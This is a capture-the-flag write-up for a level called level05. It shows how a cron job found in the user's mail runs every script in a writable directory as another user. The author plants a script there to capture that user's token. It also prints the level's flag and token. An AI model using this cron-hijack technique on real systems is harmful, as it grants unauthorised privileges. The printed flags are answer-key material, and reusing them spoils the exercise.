## FLAG: `ne2searoevaevoem4ov4ar8ap`

## I have a mail !
```
    You have new mail.
```

## This mail give me a crontable line
> cat /var/mail/level05
```
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
## `/usr/sbin/openarenaserver` running every 2 minutes for flag05 ?

## this script run every bash files in `/opt/openarenaserver/` folder
> cat /usr/sbin/openarenaserver
```
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
    done
```

------------------------------------------------

## We create our script which execute getflag command and put the result in a readable file
> vi /opt/openarenaserver/getflag.sh
```
#!/bin/bash
getflag > /tmp/05_flag
```
> cat /tmp/05_flag
```
    Check flag.Here is your token : viuaaale9huek52boumoomioc
```